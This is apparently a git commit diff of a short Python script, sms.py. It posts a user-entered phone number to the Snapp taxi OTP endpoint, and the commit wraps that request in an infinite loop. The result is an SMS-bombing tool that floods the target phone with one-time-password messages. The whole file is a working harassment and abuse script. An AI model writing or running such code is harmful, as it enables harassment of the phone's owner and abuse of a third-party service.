310b15477d0d02b96748910cdb3288a75b52612f
aliyazdani04 <98017374+aliyazdani04@users.noreply.github.com>
2022-04-12 18:15:12 +0430

    Update sms.py

--- sms.py
+++ sms.py
@@ -1,11 +1,14 @@
 import requests
+from termcolor import colored
 
 url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
 phonen = input('phone number: ')
 
 pnd = {'cellphone': f'{phonen}'}
 
-req = requests.post(url, json= pnd)
+while True:
 
-print(req.text)
+      req = requests.post(url, json= pnd)
+
+      print(req.text)
 
